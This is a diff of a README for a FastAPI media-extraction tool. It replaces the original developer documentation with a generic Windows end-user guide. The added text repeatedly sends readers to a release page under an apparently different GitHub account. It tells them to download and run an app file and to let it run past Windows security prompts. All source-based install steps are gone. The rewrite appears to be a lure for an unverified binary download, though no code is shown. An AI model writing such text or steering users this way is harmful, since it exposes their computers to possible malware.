@@ -1,277 +1,179 @@
-# Smart Media Extractor API
-
-Production-ready FastAPI service for extracting media links from YouTube, Instagram, TikTok, and other supported sources.
-
-## Features
-
-- FastAPI-based async API
-- `yt-dlp` as the main universal extractor
-- Smart routing by URL
-- Instagram priority chain: `instaloader -> gallery-dl -> yt-dlp`
-- TikTok priority chain: custom no-watermark provider -> `yt-dlp`
-- Standardized JSON response for every supported platform
-- Streaming proxy endpoint for hotlink-protected media
-- SEO-friendly web UI with animated landing pages
-- Release-friendly file logging
-
-## Standard Response
-
-`GET /extract` and `POST /extract` always return the same success shape:
-
-```json
-{
-  "status": "success",
-  "provider": "youtube",
-  "metadata": {
-    "title": "Video title",
-    "author": "Channel name",
-    "duration": "03:33",
-    "thumbnail": "https://img.youtube.com/vi/.../maxresdefault.jpg",
-    "description": "Short description..."
-  },
-  "media": {
-    "video_mp4": [
-      {
-        "quality": "1080p",
-        "url": "https://...",
-        "size_bytes": 450892100,
-        "extension": "mp4",
-        "has_audio": false
-      }
-    ],
-    "audio_only": [
-      {
-        "quality": "128kbps",
-        "url": "https://...",
-        "ext": "m4a",
-        "size_bytes": 12500000
-      }
-    ],
-    "images": [],
-    "subtitles": [
-      {
-        "lang_code": "en",
-        "language": "English",
-        "url": "https://...",
-        "format": "vtt"
-      }
-    ]
-  },
-  "config": {
-    "proxy_required": true,
-    "headers": {
-      "User-Agent": "Mozilla/5.0...",
-      "Referer": "https://www.youtube.com/"
-    },
-    "expires_at": 1711568647
-  }
-}
-```
-
-## Error Response
-
-Release mode hides raw upstream extractor messages from clients.
-
-```json
-{
-  "status": "error",
-  "code": "media_not_found",
-  "message": "Video topilmadi.",
-  "provider": "instagram",
-  "attempts": [],
-  "details": {}
-}
-```
-
-Full internal errors are written to `error.txt`.
-
-## Endpoints
-
-`GET /`
-
-Animated web UI for end users. Users can paste a media URL and instantly see available quality options, audio-only files, subtitles, images, and release-friendly errors.
-
-SEO landing pages are also available:
-
-- `/youtube-video-downloader`
-- `/instagram-downloader`
-- `/tiktok-video-downloader`
-- `/facebook-video-downloader`
-- `/x-video-downloader`
-
-SEO helper routes:
+# 🚀 dl-api - Fast Media Extraction Made Simple
 
-- `/sitemap.xml`
-- `/robots.txt`
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/chasak1919/dl-api/releases)
 
-`GET /health`
+## 📥 Download
 
-Health check.
+Visit this page to download: [https://github.com/chasak1919/dl-api/releases](https://github.com/chasak1919/dl-api/releases)
 
-`GET /extract`
+Choose the latest release, then download the Windows file that matches your system.
 
-Query params:
+## 🧭 What this app does
 
-- `url` required
-- `include_raw` optional, default `false`
+dl-api is a media extraction app that helps you pull video or audio from sites like YouTube, Instagram, TikTok, and other supported platforms.
 
-Example:
+It is built as a FastAPI service, but you do not need to know that to use it. For most users, the main job is simple: download the app, run it on Windows, and use the local web page it opens in your browser.
 
-```bash
-curl "http://127.0.0.1:8000/extract?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DdQw4w9WgXcQ&include_raw=false"
-```
+## ✅ Before you start
 
-`POST /extract`
+Make sure your PC has:
 
-Example:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- A stable internet connection
+- Enough free storage for downloaded media
+- Permission to run apps from your Downloads folder
 
-```bash
-curl -X POST "http://127.0.0.1:8000/extract" \
-  -H "Content-Type: application/json" \
-  -d "{\"url\":\"https://www.instagram.com/p/XXXXXXXXXXX/\",\"include_raw\":false}"
-```
+If your browser asks to open localhost or 127.0.0.1, allow it.
 
-`GET /stream`
+## 🖥️ How to install on Windows
 
-Proxy media through this server without saving the file to disk.
+1. Open the download page: [https://github.com/chasak1919/dl-api/releases](https://github.com/chasak1919/dl-api/releases)
+2. Find the newest release at the top
+3. Download the Windows package listed there
+4. If the file is in a .zip file, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file or start script that comes with the release
+7. Wait for the service to start
+8. Open the local address shown in the window, usually in your browser
 
-Examples:
+If Windows shows a security prompt, choose the option that lets the app run.
 
-```bash
-curl -L "http://127.0.0.1:8000/stream?url=https%3A%2F%2Fwww.tiktok.com%2F%40user%2Fvideo%2F1234567890&item_index=1" -o media.bin
-```
+## 🛠️ First-time setup
 
-```bash
-curl -L "http://127.0.0.1:8000/stream?media_url=https%3A%2F%2Fcdn.example.com%2Fvideo.mp4&referer=https%3A%2F%2Fexample.com%2Fpost%2F1" -o media.bin
-```
+After you launch the app, it may create its own local files and folders.
 
-## Project Structure
+For the first run:
 
-- `app/main.py` FastAPI app, middleware, exception handlers
-- `app/services/router.py` smart route selection and fallback chain
-- `app/services/ytdlp_base.py` shared `yt-dlp` extraction logic
-- `app/services/youtube_extractor.py` generic `yt-dlp` extractor
-- `app/services/instagram_extractor.py` Instagram extractor chain
-- `app/services/tiktok_extractor.py` TikTok extractor chain
-- `app/services/response_mapper.py` standardized API mapping layer
-- `app/services/stream_proxy.py` streaming proxy service
-- `app/services/errors.py` error classification and public error shaping
-- `app/logging_config.py` request and error file loggers
+- Keep the window open while the app starts
+- Wait until the local server is ready
+- Copy the local web address into your browser if it does not open by itself
+- Use the page to enter a media link and start extraction
 
-## Environment
+If you close the main window, the local service may stop.
 
-Create `.env` from `.env.example`.
+## 🎯 How to use it
 
-Important values:
+1. Open the local web page in your browser
+2. Paste a YouTube, Instagram, or TikTok link
+3. Select the output you want, such as video or audio
+4. Start the extraction
+5. Wait for the file to process
+6. Save the result to your computer
 
-- `DEBUG=false`
-- `REQUEST_TIMEOUT_SECONDS=20`
-- `TIKTOK_API_BASE=https://www.tikwm.com/api/`
-- `INSTAGRAM_SESSIONFILE=` optional
-- `INSTAGRAM_USERNAME=` optional
-- `INSTAGRAM_PASSWORD=` optional
-- `HTTP_USER_AGENT=` optional custom user agent
+The app uses smart fallback chains to try more than one method if a source changes its format. This helps keep downloads working across different sites.
 
-## Install
+## ⚡ Key features
 
-Windows PowerShell:
+- Fast media extraction for common social platforms
+- Support for YouTube, Instagram, TikTok, and more
+- Smart fallback chains for better reliability
+- HLS streaming proxy support
+- Local web interface for simple use
+- Built with FastAPI for speed and stability
+- Useful for video and audio workflows
+- Works as a local Windows app for end users
 
-```powershell
-python -m venv .venv
-.\.venv\Scripts\activate
-pip install -r requirements.txt
-```
+## 📂 What you may see after launch
 
-Linux/macOS:
+You may see files or folders like these:
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-```
+- config
+- logs
+- cache
+- downloads
+- temp
+- media output folders
 
-## Run In Release Mode
+These are normal. They help the app store settings, logs, and processed files.
 
-Do not use `--reload` for release.
+## 🔧 Common actions
 
-Windows PowerShell:
+### Start the app
+Double-click the app or start file from the extracted folder
 
-```powershell
-.\.venv\Scripts\uvicorn app.main:app --host 0.0.0.0 --port 8000
-```
+### Stop the app
+Close the command window or terminal window that opened with the app
 
-Linux/macOS:
+### Open the web page
+Use the local address shown in the app window, often something like `http://127.0.0.1:8000`
 
-```bash
-./.venv/bin/uvicorn app.main:app --host 0.0.0.0 --port 8000
-```
+### Download media
+Paste a supported link, choose your format, then start the job
 
-Swagger UI:
+## 🧩 Supported sources
 
-`http://127.0.0.1:8000/docs`
+This app is built for media extraction from:
 
-Web UI:
+- YouTube
+- Instagram
+- TikTok
+- Other sites supported by the underlying media engine
 
-`http://127.0.0.1:8000/`
+Support can change when a platform changes its layout or video delivery method. The fallback logic helps handle that.
 
-## Logging
+## 🌐 Browser use
 
-Two log files are created in the project root:
+You can use dl-api from any modern browser on Windows:
 
-- `log.txt` every incoming request
-- `error.txt` full internal extractor and server errors
+- Microsoft Edge
+- Google Chrome
+- Firefox
 
-This means clients only see clean public messages such as `Video topilmadi.`, while the full upstream error remains available on the server.
+If a page does not load, refresh once the app has fully started.
 
-## Production Notes
+## 🔍 Tips for smooth use
 
-- Some Instagram posts require authentication even when the URL itself is valid
-- Signed CDN URLs may expire, so clients should use the response quickly
-- `config.proxy_required=true` means the safer option is using `/stream`
-- `DEBUG` should remain `false` in production
+- Use a clean, full media link
+- Wait for the app to finish starting before you paste a link
+- Keep the app window open while a download runs
+- Save files to a folder with enough free space
+- If one link fails, try another supported source or refresh the page
 
-## Release Checklist
+## 🧪 If something looks wrong
 
-1. Create `.env`
-2. Keep `DEBUG=false`
-3. Install dependencies from `requirements.txt`
-4. Start with `uvicorn app.main:app --host 0.0.0.0 --port 8000`
-5. Verify `/health`
-6. Verify logs are being written to `log.txt` and `error.txt`
+If the app does not open right away:
 
+1. Close it
+2. Open it again
+3. Wait longer for the first start
+4. Check that your internet connection works
+5. Make sure Windows did not block the file
 
----
+If the browser shows no page:
 
-## 📬 Contact & Connect
+1. Look at the app window for the local address
+2. Copy that address into the browser
+3. Try `127.0.0.1` instead of `localhost`
 
-If you have any questions, feedback, or just want to say hi, feel free to reach out:
+If a download does not start:
 
-[![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/+QEtQD5HYHUUyM2Ey)
-[![Email](https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=icloud&logoColor=white)](mailto:muhammaddiyorshokirov72@email.com)
+1. Check the source link
+2. Try a different browser
+3. Reload the page
+4. Run the app again
 
-## ☕ Support the Project
+## 📁 Release download path
 
-If you find this project helpful and want to support its further development, you can buy me a coffee:
+Use the latest release page here: [https://github.com/chasak1919/dl-api/releases](https://github.com/chasak1919/dl-api/releases)
 
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://www.buymeacoffee.com/s17mj_09)
+That is the place to visit to download the Windows release file.
 
-> **Ethereum Network:** `0x76b0c5ec2De0A7173bcf49839f331683dAe4E941`
+## 🧰 What this project is built for
 
-## 🤝 Contributing
+dl-api is a local media extraction tool that fits users who want a simple way to pull media from public links on Windows.
 
-Contributions are what make the open-source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
+It is a good fit for:
 
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+- Saving videos for offline viewing
+- Extracting audio from a video link
+- Handling repeated downloads from social platforms
+- Running a local service on a home PC or laptop
 
-## 📜 License
+## 🗂️ Repository details
 
-Distributed under the MIT License. See `LICENSE` for more information.
-
----
-<p align="center">
-  Give a ⭐️ if this project helped you!
-</p>
+- Name: dl-api
+- Type: FastAPI media extraction service
+- Main use: download and process media from supported sites
+- Target user: Windows end user
+- Project topics: api, fastapi, instagram-downloader, media-extractor, open-source, python, rest-api, social-media-api, streaming-proxy, tiktok-downloader, video-download, yt-dlp
